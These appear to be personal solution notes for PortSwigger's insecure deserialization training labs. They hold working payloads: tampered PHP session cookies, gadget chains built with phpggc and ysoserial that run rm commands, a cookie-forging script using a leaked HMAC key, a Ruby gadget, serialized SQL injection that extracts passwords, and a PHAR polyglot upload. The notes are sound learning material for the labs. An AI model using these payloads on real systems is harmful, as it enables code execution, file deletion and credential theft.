Insecure deserialization
https://portswigger.net/web-security/deserialization

# Exploiting insecure deserialization vulnerabilities (10 labs)
https://portswigger.net/web-security/deserialization/exploiting


hints example tells:
PHP:
format: O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
function in source code: unserialize()


JAVA:
hexa: ac ed 
Base64: rO0
implemantation of java.io.Serializable
function in source code: readObject() from InputStream


magic methods:
python: __init__
PHP: __construct(), unserialize() invokes __wakeup() 
JAVA: ObjectInputStream.readObject()  
custom made magic method:
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
{
    // implementation
}


1. <!-- Lab: Modifying serialized objects -->
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects

login to user Peter and observe cookie session assined by server:
    Set-Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d;

after URLdecode and Base64 decode we get:
    O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
we got serealized PHP string!

send request (GET /my-account?id=wiener HTTP/1.1) to repeater and change admin value to 1 (=boolean yes) in Inspector:
    O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
    Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d
(make sure to delete %3d (= char) if added in the end as base64 padding...)

after verifing you have a link to admin panel in /my-accout - delete carlos:
GET /admin/delete?username=carlos HTTP/1.1


# SIRI!


2. <!-- Lab: Modifying serialized data types -->
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types

login and observe cookie:

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJqamFkNWVheXlpYXZ0bG11b2EzcHQ3cHowa3ZrNmtxZyI7fQ%3d%3d

O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"jjad5eayyiavtlmuoa3pt7pz0kvk6kqg";}

change: 
s:6:"weiner" ---> s:13:"administrator" 
s:32:"jjad5eayyiavtlmuoa3pt7pz0kvk6kqg   ---> i:0

notice:
Inspector keeps addoing padding %3d (=) when changing payload
when changing from s: to i:  - need to loose "" and the digit represnting string length. otherwise you get 
    HTTP/1.1 500 Internal Server Error
    PHP Fatal error:  Uncaught Exception: unserialize() failed)


final cookie:
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
base64 it:
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9

go to GET /admin/delete?username=carlos HTTP/1.1
carlos deleted!

# SIRI


3. <!-- Lab: Using application functionality to exploit insecure deserialization -->
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization

To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory. 

<!-- login to backup account and delete accout. send request to repeater:
    POST /my-account/delete HTTP/1.1

Cookie: session=
    Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6Im1oMnBncW14eXJ6eW53amExcnBtb2VyYWNkZDhsNHc0IjtzOjExOiJhdmF0YXJfbGluayI7czoxODoidXNlcnMvZ3JlZ2cvYXZhdGFyIjt9

after URL+base64 decode:
    O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"mh2pgqmxyrzynwja1rpmoeracdd8l4w4";s:11:"avatar_link";s:18:"users/gregg/avatar";} -->

login to gregg and observe server assigned a serilized session cookie (URL+base64 encoded):
   O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"p1lydseda2o7r4r3w7jls0axc3ecynwp";s:11:"avatar_link";s:18:"users/gregg/avatar";}

send request (/my-account) with session cookie to repeater

in Inspector:
change avater link to the file we want to delete from carlos account and change string length accordingly:
s:19:"users/wiener/avatar" -->  s:22:"home/carlos/morale.txt


send delete request with manipulated cookie:
    POST /my-account/delete HTTP/1.1

    O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"oq6e0v2c6x8futamupr1xpbcn2krj9s2";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
though in original request there is no / before path - lab banner appeared only if i added it. maybe importanat to add or maybe a lab mistake...


64based:
    Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvcTZlMHYyYzZ4OGZ1dGFtdXByMXhwYmNuMmtyajlzMiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
note there are no %3d (= padding) in the end. sometime Inspector adds and cause a 500 internal error


<!-- 
test (delete gereggs avatar pic with account delete request)
avatar?avatar=gregg

O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"oq6e0v2c6x8futamupr1xpbcn2krj9s2";s:11:"avatar_link";s:19:"users/wiener/avatar";}


O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"oq6e0v2c6x8futamupr1xpbcn2krj9s2";s:11:"avatar_link";s:19:"avatar?avatar=gregg";} -->

# DUCKED


# Magic methods
https://portswigger.net/web-security/deserialization/exploiting#Magic%20methods

examples 
PHP:  __construct()
Python:  __init__


PHP:
    unserialize() method looks for and invokes an object's __wakeup() magic method. 
    
Java:
    ObjectInputStream.readObject() method is used to read data from the initial byte stream

Serializable classes can also declare their own readObject() method that acts as a magic method and invoked during deserialization:
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
    {
        // implementation
    }
 


4. <!-- Lab: Arbitrary object injection in PHP  -->
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php

to solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab. 

hint:
You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file

# stage 1  - find injection location:

1 . lets search for interesting remarks in responses by looking for keyword <!-- 

2 . in /my-account find a remark exposing .php file name:
    <!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->

3 . navigate to location in remark: GET /libs/CustomTemplate.php HTTP/1..1
    get 200 OK - but no interseting data is visible

4 . add ~ to search for backup: GET /libs/CustomTemplate.php~ HTTP/1.1
    response - source code exposed!

<?php
class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
(see file: /Insecure deserialization - source code to exploite.php)

5 . look in source code for any interesting method - find 2 optional injection points:
    
    public function __construct($template_file_path) {
            $this->template_file_path = $template_file_path;
            $this->lock_file_path = $template_file_path . ".lock";

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);

notes
__ in the begining of method to indicate magic method. 
public scope allows access to method (no declaration resaults in public as default)
carlos remark  is clue 
unlin = delet file
https://www.php.net/manual/en/function.unlink.php
__destruct checking for presence of var $lock_file_path and if xist delets it while __construct just assign values to variables
we will use __destruct as injection point


# stage 2 - crafting the payload
defining needed action:
inject object into libs/CustomTemplate.php via the serilized cookie. obejct should transfer path of the file needed to be deleted, to __destruct magic method.


1 . check wether the page request authentication:
 original cookie transfered to vaulnarnle page:
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"aq9efpm6bin4o2uc46aehubsnxi2h2hp";}

delete cookie
response: 200 OK
no need for authentication cookie - we can instll payload instead 


2 . create object from class "CustomTemplate", assian a value to "$lock_file_path" variable containing path of file to be deleted:

O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

once file path reaches __destruct() magic method it will be deleted with unlink method

# SIRIDUDE!





6. <!-- Lab: Exploiting Java deserialization with Apache Commons -->
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory. 

os command:
rm /home/carlos/morale.txt

add Desirialization-Sscanner (DS) via BApp

login to issue serialized session cookie and send request to DS - Exploiting and mark insertion point in after 'session='

use payload above and iterate through diifferent gadget chains
use Base64 encoding followed by URK encoding (base64 url safe issue an error)

final payload:
CommonsCollections3  'rm /home/carlos/morale.txt'

# YSO!

7. <!-- Lab: Exploiting PHP deserialization with a pre-built gadget chain -->
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory. 

1 . login to wiener and abserve session cookie:
    {"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ0N2psN2g3dWVhYzYycjQ0ZTV0aTc2ODdrcWdhY21pdyI7fQ==","sig_hmac_sha1":"e19c81232a9a441071c2923c125d29a5026b8d51"}

after further decoding of the token value:
    {"token":"O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"t7jl7h7ueac62r44e5ti7687kqgacmiw";}","sig_hmac_sha1":"e19c81232a9a441071c2923c125d29a5026b8d51"}

2 . look for intersting remarks (with <!- keeyword) - find in /:
   <!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->

3 . GET /cgi-bin/phpinfo.php HTTP/1.1
response:
    PHP Version 7.4.3
    ..
    <td class="e">SECRET_KEY </td><td class="v">k85kxs1xnxpg4jgj8fepexca1pcucqr7 </td>
    ..
    
4 . try changing the token and observe error stating: the framework is symfony 4.3.6

5 . look for serialized vulnarbilty in Symfony:
└─$ phpggc -l symfony   

    Gadget Chains
    -------------

    NAME            VERSION                        TYPE                   VECTOR         I    
    Symfony/FW1     2.5.2                          File write             DebugImport    *    
    Symfony/FW2     3.4                            File write             __destruct          
    Symfony/RCE1    3.3                            RCE (Command)          __destruct     *    
    Symfony/RCE2    2.3.42 < 2.6                   RCE (PHP code)         __destruct     *    
    Symfony/RCE3    2.6 <= 2.8.32                  RCE (PHP code)         __destruct     *    
    Symfony/RCE4    3.4.0-34, 4.2.0-11, 4.3.0-7    RCE (Function call)    __destruct     *

└─$ phpggc Symfony/rce4 -i                                               
    Name           : Symfony/RCE4
    Version        : 3.4.0-34, 4.2.0-11, 4.3.0-7
    Type           : RCE (Function call)
    Vector         : __destruct
    Informations   : 
    Execute $function with $parameter (CVE-2019-18889)

    ./phpggc Symfony/RCE4 <function> <parameter>



6 . craft payload:
   └─$ phpggc -b Symfony/rce4 exec 'rm /home/carlos/morale.txt'      
resualt:

    Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319

7 . create token_gen.php:
    
    <?php
    $object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319";
    $secretKey = "k85kxs1xnxpg4jgj8fepexca1pcucqr7";
    $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
    echo $cookie;

resault:
    
    %7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319%22%2C%22sig_hmac_sha1%22%3A%22db953b73aa20c821f60d3e1ebdb510d1aae1c059%22%7D

# SIRI!



8. <!-- Lab: Exploiting Ruby deserialization using a documented gadget chain -->
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain

dude.... ruby is wierd...

port solution:
use script from:
https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

replace variable "id" with "rm /home/carlos/morale.txt"
change last 2 lines to "puts paylod"

run script:

<!-- └─$ ruby GC\ port\ lab.rb                                                                                                      1 ⨯
cGem::SpecFetchercGem::InstallerU:Gem::Requirement[o:Gem::Package::TarReader@ioo:Net::BufferedIO;o:#Gem::Package::TarReader::Entry:
@readi:
       @headerIaaa:ET:@debug_outputo:Net::WriteAdapter:
                                                       @socketo:Gem::RequestSet:
@setso;;m
         Kernel:@method_id:
@git_setI"rm /home/carlos/morale.txt;
                                     T;:
                                        resolve -->

└─$ ruby GC\ port\ lab.rb | base64
    BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50
    WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286
    I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEG
    OgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6
    UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdp
    dF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQo=

# DERAILED!

9. <!-- Lab: Developing a custom gadget chain for Java deserialization -->
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization

To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the administrator and delete Carlos's account. 

research target - find:
    GET /backup/AccessTokenUser.java HTTP/1.1

go up to /backup and find link to :
    /backup/ProductTemplate.java

inside page find injection point - var "id":
           String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);

possible SQLi - lets check

use portswiggers crafter to serialize the payload (me not know Java good enough):
https://replit.com/@n1njaZ0Z/crafter#Main.java

test for SQLi vector:
    payload = '
serilized ProductTemplate:
    rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAASc=

send as cookie to 
    GET /my-account HTTP/1.1

response:
    java.io.IOException: org.postgresql.util.PSQLException: 
    ERROR: unterminated quoted string at or near &quot;&apos;&apos;&apos; LIMIT 1&quot;

We have a sqli vector!
(SQLi cheetsheet: https://portswigger.net/web-security/sql-injection/cheat-sheet)

1 . enumerate number of columns with UNION SELECT NULL,...
    payload= ' UNION SELECT NULL --
serilized ProductTemplate:
    rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAFicgVU5JT04gU0VMRUNUIE5VTEwgLS0=
responce error:    
    java.io.IOException: org.postgresql.util.PSQLException: ERROR: each UNION query must have the same number of columns
  Position: 51

 continue until nymber of coulmns match:
    payload= ' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --
serilized ProductTemplate:
    rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAQCcgVU5JT04gU0VMRUNUIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwgLS0=
error responce:
    java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser

(can be done also with "' ORDER by 8 --":


2 . detrmine data type of each column by replacing NULL with a string:
payload:
    '  UNION SELECT 'TEST', NULL, NULL, NULL, NULL, NULL, NULL, NULL --
serialized:
    rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAQycgIFVOSU9OIFNFTEVDVCAnVEVTVCcsIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwgLS0=    
response:
    java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser

payload:
    '  UNION SELECT NULL, NULL, NULL, 'TEST', NULL, NULL, NULL, NULL --
serialized:
    rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAQycgIFVOSU9OIFNFTEVDVCBOVUxMLCBOVUxMLCBOVUxMLCAnVEVTVCcsIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwgLS0=
response:
    java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;TEST&quot;

note: column 4 reflects entered value - allows leaking information out - but expects numeric value (int)

3 . research DB:
Serialized object: 

rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAUycgYW5kIDE9Y2FzdCgoU0VMRUNUIHRhYmxlX25hbWUgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIExJTUlUIDEgKSBhcyBpbnQpIC0t

Deserialized object ID: 
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 ) as int) --
response:
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;users&quot;

table_name = users



Serialized object: 

rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAbScgYW5kIDE9Y2FzdCgoU0VMRUNUIGNvbHVtbl9uYW1lIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgV2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIExJTUlUIDEpIGFzIGludCkgLS0=

Deserialized object ID: 
' and 1=cast((SELECT column_name FROM information_schema.columns Where table_name='users' LIMIT 1) as int) --

response:
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;username&quot;

username is the first column? lets offset the limit by 1 to find more columns:

Serialized object: 

rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAdicgYW5kIDE9Y2FzdCgoU0VMRUNUIGNvbHVtbl9uYW1lIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgV2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIExJTUlUIDEgb2Zmc2V0IDEpIGFzIGludCkgLS0=

Deserialized object ID: 
' and 1=cast((SELECT column_name FROM information_schema.columns Where table_name='users' LIMIT 1 offset 1) as int) --

response:
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;password&quot;

password is the column we need to retrieve information from



Serialized object: 

rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAPCcgYW5kIDE9Y2FzdCgoU0VMRUNUIHBhc3N3b3JkIEZST00gdXNlcnMgTElNSVQgMSkgYXMgaW50KSAtLQ==

Deserialized object ID: 
' and 1=cast((SELECT password FROM users LIMIT 1) as int) --

response:
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;wsqact115uoh70oblr7n&quot;

password:
wsqact115uoh70oblr7n



additional solutions and payloads:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based
https://vanshal.medium.com/sql-injection-by-developing-a-custom-gadget-chain-for-java-deserialization-73e1dcbb9d09

# JAVAED!



10. <!-- Lab: Developing a custom gadget chain for PHP deserialization -->
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization

To solve the lab, delete the morale.txt file from Carlos's home directory. 
RCE needed: 
rm /home/carlos/morale.txt


LOGIN and observe session cookie:
    O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"z2yba2voolwc6n1k5rty1v44qvl2hxsj";}

note remark:
    <!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->

GET /cgi-bin/libs/CustomTemplate.php HTTP/1.1
response: 
    HTTP/1.1 200 OK

GET /cgi-bin/libs/CustomTemplate.php~ HTTP/1.1
response:
    HTTP/1.1 200 OK
..
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>

(see file: Insecure deserialization/CustomTemplate.php~)

possible injection points:


O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}

explanation:
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = "exec"

Product constructor try to fetch the default_desc_type from the DefaultMap object. As it doesn't have this attribute, the __get() method will invoke the callback exec() method on the default_desc_type, which is set to our Carlos-delete command

PHP is more fun than JAVA

# GADGETED!



11. <!-- Lab: Using PHAR deserialization to deploy a custom gadget chain -->
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain

hint:
phar utilized via Filesystem methods
technique requires upload to server - (for example via polyglot jpg vector)

To solve the lab, delete the morale.txt file from Carlos's home directory. 
RCE needed: 
rm /home/carlos/morale.txt

materials:
https://www.w3schools.com/PHP/php_ref_filesystem.asp
https://www.php.net/manual/en/wrappers.phar.php
https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability


The manifest is where the metadata resides. It includes information about the archive and each file within it. 
More importantly, the metadata is stored in a serialized format.


stage 1 - creating phar file using php script as in file:
Insecure deserialization/phar_Genrator.php








stage 2 - uploading a polyglot to server:

praprade polyglot from .phar file inserted to .jpg file exif comments with exiftool:
    $ exiftool -Comment'<='poc.phar hacker.jpg -o poly_phar.jpg

upload to server as profile avater:
    POST /my-account/avatar HTTP/1.1

retrieve uploaded file with phar:// wrapper:
    GET phar:///cgi-bin/avatar.php?avatar=wiener HTTP/1.1
resonse:
    HTTP/1.1 200 OK
    ..
    ÿØÿà JFIF      ÿþ î<?php $x=1; __HALT_COMPILER(); ?>
              g   O:12:"PDFGenerator":2:{s:8:"callback";s:8:"passthru";s:8:"fileName";s:26:"rm /home/carlos/morale.txt";}






1 . check Target and notice
GET /cgi-bin/avatar.php HTTP/1.1
response:
HTTP/1.1 404 Not Found
..
<pre>
PHP Notice:  Undefined index: avatar in /home/carlos/cgi-bin/avatar.php on line 8
</pre>

???

2 . upload image and see it in
GET /cgi-bin/avatar.php?avatar=wiener HTTP/1.1






rm /home/carlos/morale.txt


